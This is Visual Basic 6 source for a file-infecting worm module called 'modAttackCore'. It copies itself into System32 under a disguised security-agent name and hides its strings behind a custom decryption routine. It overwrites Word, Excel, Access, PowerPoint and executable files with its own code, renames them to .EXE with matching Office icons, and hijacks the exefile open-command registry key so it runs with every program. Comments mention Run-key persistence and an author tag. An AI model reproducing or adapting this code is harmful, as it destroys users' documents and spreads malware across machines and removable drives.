Attribute VB_Name = "modAttackCore"
' HIDE FILE EXTENSION
' KEY: HKCU\Software\Microsoft\Windows\CurrentVerion\Explorer\Advance, REG_DWORD (0x00000000 (0))
'
'
Option Explicit

Private Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Public Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long

Public FSo                                        As Object
Public WSo                                        As Object

Public PathToAttack                               As String

Dim Filename                                      As String
Dim dSys                                          As String
Dim dWin                                          As String
Public dTmp                                       As String
Dim dWord                                         As String
Dim dExcel                                        As String
Dim dPPoint                                       As String
Dim dAccess                                       As String

Public MyWormOnSys32                              As String

Public Const RemovableDrive = 1
Public rKey                                       As String
Public DisguisedFilename                          As String
Public aDoc                                       As String
Public Initial                                    As String
Public renExt                                     As String

Sub Initialize()
     Dim sFSO                 As String
     Dim sWSO                 As String
     Dim AppPath              As String
     Dim sErr                 As String
     
     sFSO = DoDecrypt("RB]fc_b]{V]:T[mGcbaYQ>Y^cR")
     sWSO = DoDecrypt("BFfW_X" + Chr$(34) + "hWB`Ym[")
     
     Set FSo = CreateObject(sFSO)
     Set WSo = CreateObject(sWSO)
     
     dTmp = FSo.GetSpecialFolder(2) + "\"
     dSys = FSo.GetSpecialFolder(1)
     dWin = FSo.GetSpecialFolder(0)
     
     'AppPath = "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\"
     AppPath = DoDecrypt(":7A@BK:CFCF5K4]AaRgcU^PhXFXbf^Pgd2ff]TJhaT]g]^5P__DrcPg\mK")

'     dWord = WSo.RegRead(AppPath + "Winword.exe\")
'     dExcel = WSo.RegRead(AppPath + "Excel.exe\")
'     dPPoint = WSo.RegRead(AppPath + "PowerPnt.exe\")
'     dAccess = WSo.RegRead(AppPath + "MSACCESS.EXE\")

     dWord = WSo.RegRead(AppPath + DoDecrypt("XFkba^" + Chr$(34) + "XgTPY"))
     dExcel = WSo.RegRead(AppPath + DoDecrypt("g4YW{[lYKT"))
     dPPoint = WSo.RegRead(AppPath + DoDecrypt("^?Yk?ahbT{YlmK"))
     dAccess = WSo.RegRead(AppPath + DoDecrypt("B<7542GG4{9LmK"))
     
'     DisguisedFilename = "SECAGENT.EXE"
'     rKey = "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\SecurityAgent"
'     Initial = "From DarkSpongeBob =)"
     
     ' Decrypt
     DisguisedFilename = DoDecrypt("c]YgdR]fhcY" + Chr$(34) + "Tg")
     rKey = DoDecrypt(":7A@BKZcfcfUKT]AaRgcU^PhXFXbf^Pgd2ff]TJhaT]g]^FP]dGPRTficX5mTVhb")
     Initial = DoDecrypt("z8aU2zfcW]`c^Xrsm8YbSTDrZXhUmPcZmama1mbiWV`cnT1rm_")
     MyWormOnSys32 = FSo.Buildpath(dSys, DisguisedFilename)
     
     aDoc = "doc"
     renExt = ".EXE"
     
     Call Check_exefile_key
End Sub

Sub ReleaseWorm()
     On Error GoTo hell
     
     Dim ret                  As Long
     Dim sErr                 As String
     Dim res                  As Boolean
     
     If Not FSo.FileExists(MyWormOnSys32) Then
          Filename = FSo.Buildpath(App.Path, VirusEXEName)
          FSo.CopyFile Filename, dSys + "\": DoEvents
          Filename = FSo.Buildpath(dSys, VirusEXEName)
          Name Filename As MyWormOnSys32: DoEvents
          
          Call IconKo
          Call SaveToFile(FSo.Buildpath(dTmp, "1011.ico"))
          ReplaceIcons FSo.Buildpath(dTmp, "1011.ico"), MyWormOnSys32, sErr
          Call RemoveExtractedIcon
          
          'SetAttr MyWormOnSys32, vbHidden + vbReadOnly + vbSystem:doevents
          
          End
     End If
        
     Exit Sub
hell:
     WriteErrorLog DoDecrypt("TAY`bPKYa^zamv") + vbCrLf & Err.Number & ": " + Err.Description
End Sub

Sub AttackPath(ByVal RewriteIt As Boolean)
     On Error GoTo hell
     
     Dim vFolder              As Object
     Dim vSubFolder           As Object
     Dim oFiles               As Object
     Dim vFile                As Object
     
     Dim ext                  As String
     Dim sFilename            As String
     Dim sParentDir           As String
     
     Dim sErr                 As String
     Dim sBin                 As String
     
     Dim UseIco               As String
     
     Dim Attack               As Boolean
     
     Dim ret                  As Long
     
     If PathToAttack = vbNullString Then Exit Sub

     Set vFolder = FSo.GetFolder(PathToAttack)
     Set vSubFolder = vFolder.Files

     frmMain.Timer1.Enabled = False
     
     For Each oFiles In vSubFolder
          ext = LCase$(FSo.GetExtensionName(oFiles.Path))

          sParentDir = FSo.GetParentFolderName(oFiles.Path)
          sFilename = FSo.GetFilename(oFiles.Path)
          
          Attack = False
          
          If ext = "doc" Then
               ret = ExtractIcons(dWord, dTmp + "1")
               UseIco = DoDecrypt("u {&X{cW")
               Attack = True
          ElseIf ext = "xls" Then
               ret = ExtractIcons(dExcel, dTmp + "1")
               UseIco = DoDecrypt("u {&X{cW")
               Attack = True
          ElseIf ext = "mdb" Then
               ret = ExtractIcons(dAccess, dTmp + "1")
               UseIco = DoDecrypt("u {&X{cW")
               Attack = True
          ElseIf ext = "ppt" Then
               ret = ExtractIcons(dPPoint, dTmp + "1")
               UseIco = DoDecrypt("u {&X{cW")
               Attack = True
          ElseIf ext = "exe" Then
               Set vFile = FSo.opentextfile(oFiles.Path)
               sBin = vFile.readall: DoEvents
               vFile.Close
               Set vFile = Nothing
               
               If Right$(sBin, 2) = DoDecrypt("_,") Then ' _, = =p
                    Attack = False
               Else
                    ret = ExtractIcons(oFiles.Path, dTmp + sFilename)
                    Attack = True

                    UseIco = sFilename + ".ico"
               End If
               
               sBin = vbNullString
          End If
               
          If Attack Then
               If DoAttack(RewriteIt, oFiles.Path, ext) Then
                    If RewriteIt Then
                         If ret = 0 Then
                              ret = ReplaceIcons(FSo.Buildpath(dTmp, UseIco), _
                                                 FSo.Buildpath(sParentDir, FSo.GetBaseName(sFilename) + renExt), _
                                                 sErr)
                                           
                              DoEvents
                         End If
                    End If
               End If
          End If
     Next
     
     frmMain.Timer1.Enabled = True
     RemoveExtractedIcon
     
     Exit Sub
hell:
     frmMain.Timer1.Enabled = True
     RemoveExtractedIcon
     
     WriteErrorLog DoDecrypt("c0UhZRUDWc{z") + vbCrLf & Err.Number & ": " + Err.Description
End Sub

Function DoAttack(ByVal RewriteIt As Boolean, ByVal FileToAttack As String, ByVal ext As String) As Boolean
     On Error GoTo hell
     
     Dim sFilename            As String
     Dim sParentDir           As String
     Dim Chunks               As String
     
     sParentDir = FSo.GetParentFolderName(FileToAttack)
     sFilename = FSo.GetFilename(FileToAttack)
     
     If Not RewriteIt Then
          If ext <> "exe" Then Exit Function
          
          If FSo.FileExists(FileToAttack) Then
               Open FileToAttack For Binary As #1
                    Put #1, LOF(1), Initial
                    DoEvents
               Close #1
               
               DoAttack = True
          Else
               DoAttack = False
          End If
          
     ElseIf RewriteIt Then
          Kill FileToAttack: DoEvents
          
          If ext <> "exe" Then
               If FSo.FileExists(FSo.Buildpath(sParentDir, FSo.GetBaseName(sFilename) + renExt)) Then
                    Kill FileToAttack
               End If
          End If
          
          Open MyWormOnSys32 For Binary As #1
               Open FileToAttack For Binary As #2
                    Do While Not EOF(1)
                         Chunks = Input(2048, #1)
                         Put #2, , Chunks
                         DoEvents
                    Loop

                    Put #2, , Initial
                    DoEvents
               Close #2
               DoEvents
          Close #1
          DoEvents
          
          If ext <> "exe" Then
               Name FileToAttack As FSo.Buildpath(sParentDir, FSo.GetBaseName(sFilename) + renExt)
          End If
          
          DoAttack = True
     End If
     
     Exit Function
hell:
     WriteErrorLog DoDecrypt("^3h5Pc_Wvu") + vbCrLf & Err.Number & ": " + Err.Description
     DoAttack = False
End Function

Function IsRemovableDrive(ByVal strDrive As String) As Boolean
     Dim oDrive               As Object
     
     IsRemovableDrive = False
     
     ' overwrite passed data to retrieve the right drive name
     strDrive = FSo.GetDriveName(strDrive)
     
     ' GetDriveName returns only the valid drive name
     If Trim$(strDrive) = vbNullString Then IsRemovableDrive = False: Exit Function
     
     Set oDrive = FSo.GetDrive(strDrive)
     
     If oDrive.DriveType = RemovableDrive Then
          IsRemovableDrive = True
     End If
End Function

Sub Check_exefile_key()
     '"%1" %*
     On Error GoTo hell
     Dim tmp                  As String
     
     '                            HKCR\exefile\shell\open\command\
     tmp = WSo.RegRead(DoDecrypt(":7F7TKYlXUY`bKY\[[cPT_Pb^Raa]PPX"))
     
     If tmp = Chr$(34) + "%1" + Chr$(34) + " %*" Then '"%1" %*
          WSo.RegWrite DoDecrypt(":7F7TKYlXUY`bKY\[[cPT_Pb^Raa]PPX"), MyWormOnSys32 + Chr$(32) + Chr$(34) + "%1" + Chr$(34) + " %*"
     End If
hell:
End Sub

Sub Reset_exefile_key()
     On Error GoTo hell
     WSo.RegWrite DoDecrypt(":7F7TKYlXUY`bKY\[[cPT_Pb^Raa]PPX"), Chr$(34) + "%1" + Chr$(34) + " %*"
     Exit Sub
hell:
End Sub

Function DoDecrypt(ByVal Encrypted As String) As String
     DoDecrypt = Decrypt(Encrypted, "mmrr", NynTFor94)
End Function

Sub WriteErrorLog(ByVal ErrorString As String)
     Dim oFile As Object
     
     If Not FSo.FileExists(FSo.Buildpath(dTmp, DoDecrypt("a4GfX_YX{ac@mV"))) Then
          '                                                             ErrSpider.log
          Set oFile = FSo.createtextfile(FSo.Buildpath(dTmp, DoDecrypt("a4GfX_YX{ac@mV")))
          oFile.write "*/" + vbCrLf + ErrorString + vbCrLf + "/*" + vbCrLf
          oFile.Close
     Else
          Set oFile = FSo.opentextfile(FSo.Buildpath(dTmp, DoDecrypt("a4GfX_YX{ac@mV")), 8)
          oFile.write "*/" + vbCrLf + ErrorString + vbCrLf + "/*" + vbCrLf
          oFile.Close
     End If
     
     Set oFile = Nothing
End Sub

Function RemoveDoubleQuotes(ByVal str As String) As String
     Dim tmp As String
     
     tmp = Right$(str, Len(str) - 1)
     RemoveDoubleQuotes = Left$(tmp, Len(tmp) - 1)
End Function
